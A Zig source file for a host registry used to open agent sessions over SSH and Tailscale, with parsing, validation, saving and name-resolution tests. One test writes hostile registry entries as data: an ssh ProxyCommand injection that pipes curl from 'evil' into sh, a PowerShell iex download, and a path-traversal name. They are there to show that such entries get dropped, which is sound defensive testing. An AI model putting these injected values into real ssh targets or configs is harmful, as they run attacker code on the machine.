//! The machine registry: ~/.config/work/hosts.conf, one line per machine.
//!
//!   host <tailnet-name> <user@ssh-host> <posix|msys>
//!   self <tailnet-name>
const std = @import("std");
const sys = @import("sys.zig");

pub const Kind = enum { posix, msys };

pub const Host = struct {
    name: []const u8,
    target: []const u8,
    kind: Kind,
};

pub const Registry = struct {
    path: []const u8,
    hosts: []Host,
    self_line: ?[]const u8,
    /// Which host is this machine (after WORK_SELF, the self line, tailnet, hostname).
    self: ?[]const u8,
    /// Entries `load` refused. Shown where a human reads the registry, never on
    /// the protocol's output.
    dropped: usize = 0,

    pub fn find(reg: Registry, token: []const u8) ?Host {
        return if (reg.resolve(token)) |i| reg.hosts[i] else null;
    }

    /// Exact name, or a prefix that matches exactly one host.
    pub fn resolve(reg: Registry, token: []const u8) ?usize {
        for (reg.hosts, 0..) |h, i| if (std.mem.eql(u8, h.name, token)) return i;
        var hit: ?usize = null;
        for (reg.hosts, 0..) |h, i| {
            if (std.mem.startsWith(u8, h.name, token) or containsWord(h.name, token)) {
                if (hit != null) return null;
                hit = i;
            }
        }
        return hit;
    }

    pub fn isSelf(reg: Registry, host: Host) bool {
        return if (reg.self) |s| std.mem.eql(u8, s, host.name) else false;
    }
};

/// "linux2" matches "home-linux2": a dash-separated part of the name.
fn containsWord(name: []const u8, token: []const u8) bool {
    if (token.len < 3) return false;
    var it = std.mem.splitScalar(u8, name, '-');
    while (it.next()) |part| if (std.mem.startsWith(u8, part, token)) return true;
    return false;
}

pub fn configPath(ctx: sys.Ctx) ![]u8 {
    if (ctx.getenv("WORK_CONFIG")) |p| return ctx.gpa.dupe(u8, p);
    if (ctx.getenv("XDG_CONFIG_HOME")) |x| return ctx.join(&.{ x, "work", "hosts.conf" });
    return ctx.join(&.{ ctx.home(), ".config", "work", "hosts.conf" });
}

pub fn load(ctx: sys.Ctx) !Registry {
    const path = try configPath(ctx);
    var hosts: std.ArrayList(Host) = .empty;
    var self_line: ?[]const u8 = null;
    var dropped: usize = 0;
    if (sys.readFile(ctx, path)) |bytes| {
        var lines = std.mem.splitScalar(u8, bytes, '\n');
        while (lines.next()) |raw| {
            var words = std.mem.tokenizeAny(u8, std.mem.trim(u8, raw, " \t\r"), " \t");
            const kw = words.next() orelse continue;
            if (kw[0] == '#') continue;
            if (std.mem.eql(u8, kw, "self")) {
                self_line = words.next();
            } else if (std.mem.eql(u8, kw, "host")) {
                const name = words.next() orelse continue;
                const target = words.next() orelse continue;
                const kind: Kind = if (std.mem.eql(u8, words.next() orelse "posix", "msys")) .msys else .posix;
                // The registry is rewritten by `agb deploy` from another machine:
                // a destination that is really an ssh option would run a command
                // here on the next listing. An entry that is not a machine is dropped.
                if (!sys.validSlug(name) or !sys.validSshTarget(target)) {
                    dropped += 1;
                    continue;
                }
                try hosts.append(ctx.gpa, .{ .name = name, .target = target, .kind = kind });
            }
        }
    }
    var reg = Registry{ .path = path, .hosts = hosts.items, .self_line = self_line, .self = null, .dropped = dropped };
    reg.self = detectSelf(ctx, reg);
    return reg;
}

fn detectSelf(ctx: sys.Ctx, reg: Registry) ?[]const u8 {
    if (ctx.getenv("WORK_SELF")) |s| return s;
    if (reg.self_line) |s| return s;
    if (tailnetSelf(ctx)) |name| for (reg.hosts) |h| if (std.mem.eql(u8, h.name, name)) return h.name;
    const host = hostname(ctx) orelse return null;
    for (reg.hosts) |h| if (std.ascii.eqlIgnoreCase(h.name, host)) return h.name;
    return null;
}

pub fn hostname(ctx: sys.Ctx) ?[]const u8 {
    const out = sys.run(ctx, &.{"hostname"}, null);
    if (!out.ok) return null;
    const full = out.text();
    return full[0 .. std.mem.indexOfScalar(u8, full, '.') orelse full.len];
}

pub fn tailscaleBin(ctx: sys.Ctx) ?[]const u8 {
    if (sys.which(ctx, "tailscale")) |p| return p;
    for ([_][]const u8{ "/Applications/Tailscale.app/Contents/MacOS/Tailscale", "C:\\Program Files\\Tailscale\\tailscale.exe", "/usr/bin/tailscale" }) |p|
        if (sys.isFile(ctx, p)) return p;
    return null;
}

pub fn tailnetSelf(ctx: sys.Ctx) ?[]const u8 {
    const ts = tailscaleBin(ctx) orelse return null;
    const out = sys.run(ctx, &.{ ts, "status", "--self=true", "--peers=false" }, null);
    if (!out.ok) return null;
    var lines = std.mem.splitScalar(u8, out.stdout, '\n');
    while (lines.next()) |line| {
        var words = std.mem.tokenizeAny(u8, line, " \t\r");
        const ip = words.next() orelse continue;
        if (std.mem.startsWith(u8, ip, "100.")) return words.next();
    }
    return null;
}

pub const Peer = struct { name: []const u8, os: []const u8 };

pub fn tailnetPeers(ctx: sys.Ctx) ?[]Peer {
    const ts = tailscaleBin(ctx) orelse return null;
    const out = sys.run(ctx, &.{ ts, "status" }, null);
    if (!out.ok) return null;
    var peers: std.ArrayList(Peer) = .empty;
    var lines = std.mem.splitScalar(u8, out.stdout, '\n');
    while (lines.next()) |line| {
        var words = std.mem.tokenizeAny(u8, line, " \t\r");
        const ip = words.next() orelse continue;
        if (!std.mem.startsWith(u8, ip, "100.")) continue;
        const name = words.next() orelse continue;
        _ = words.next();
        const os = words.next() orelse continue;
        peers.append(ctx.gpa, .{ .name = name, .os = os }) catch {};
    }
    return peers.items;
}

const header =
    \\# Machines where agb can create and attach agent sessions.
    \\# Name = the machine's name on the tailnet.
    \\#
    \\#   host <tailnet-name> <user@ssh-host> <posix|msys>
    \\#   self <tailnet-name>        which of them is this machine
    \\#
    \\# `agb hosts discover` fills this in from `tailscale status`.
    \\
;

/// Rewrites the file from the registry (header, hosts, self line).
pub fn save(ctx: sys.Ctx, reg: Registry, self_name: ?[]const u8) !void {
    var out: std.ArrayList(u8) = .empty;
    try out.appendSlice(ctx.gpa, header);
    for (reg.hosts) |h| try out.appendSlice(ctx.gpa, try ctx.fmt("host {s} {s} {s}\n", .{ h.name, h.target, @tagName(h.kind) }));
    if (self_name) |s| try out.appendSlice(ctx.gpa, try ctx.fmt("self {s}\n", .{s}));
    if (std.fs.path.dirname(reg.path)) |dir| try std.Io.Dir.cwd().createDirPath(ctx.io, dir);
    try sys.writeFileAtomic(ctx, reg.path, out.items);
}

/// The registry file as another machine should get it: same hosts, its own self line.
pub fn renderFor(ctx: sys.Ctx, reg: Registry, self_name: []const u8) ![]u8 {
    var out: std.ArrayList(u8) = .empty;
    try out.appendSlice(ctx.gpa, header);
    for (reg.hosts) |h| try out.appendSlice(ctx.gpa, try ctx.fmt("host {s} {s} {s}\n", .{ h.name, h.target, @tagName(h.kind) }));
    try out.appendSlice(ctx.gpa, try ctx.fmt("self {s}\n", .{self_name}));
    return out.items;
}

test "an entry that is not a machine is dropped, whatever wrote the file" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    const gpa = arena.allocator();
    var env = std.process.Environ.Map.init(gpa);
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const path = try std.fs.path.join(gpa, &.{ ".zig-cache", "tmp", &tmp.sub_path, "hosts.conf" });
    try env.put("WORK_CONFIG", path);
    try env.put("WORK_SELF", "good");
    const ctx = sys.Ctx{ .io = std.testing.io, .gpa = gpa, .env = &env };
    try sys.writeFileAtomic(ctx,
        path,
        \\host good alice@good posix
        \\host evil -oProxyCommand=curl\u{20}evil|sh posix
        \\host pwsh a';iex(iwr\u{20}x);#@win msys
        \\host ../../etc alice@x posix
        \\host scp alice@host:/tmp posix
        \\
    );
    const reg = try load(ctx);
    try std.testing.expectEqual(@as(usize, 1), reg.hosts.len);
    try std.testing.expectEqual(@as(usize, 4), reg.dropped);
    try std.testing.expectEqualStrings("good", reg.hosts[0].name);
}

test "resolve by name, prefix and dash word" {
    var hosts = [_]Host{
        .{ .name = "macbook", .target = "alice@macbook", .kind = .posix },
        .{ .name = "windows-pc", .target = "alice@windows-pc", .kind = .msys },
        .{ .name = "home-linux", .target = "alice@home-linux", .kind = .posix },
        .{ .name = "home-linux2", .target = "alice@home-linux2", .kind = .posix },
    };
    const reg = Registry{ .path = "", .hosts = &hosts, .self_line = null, .self = "macbook" };
    try std.testing.expectEqual(@as(?usize, 1), reg.resolve("windows-pc"));
    try std.testing.expectEqual(@as(?usize, 1), reg.resolve("windows"));
    try std.testing.expectEqual(@as(?usize, 3), reg.resolve("linux2")); // a dash part, not a prefix
    try std.testing.expectEqual(@as(?usize, 0), reg.resolve("mac"));
    try std.testing.expectEqual(@as(?usize, 2), reg.resolve("home-linux")); // exact beats prefix
    try std.testing.expectEqual(@as(?usize, null), reg.resolve("linux")); // ambiguous
    try std.testing.expectEqual(@as(?usize, null), reg.resolve("mars"));
    try std.testing.expect(reg.isSelf(hosts[0]));
}
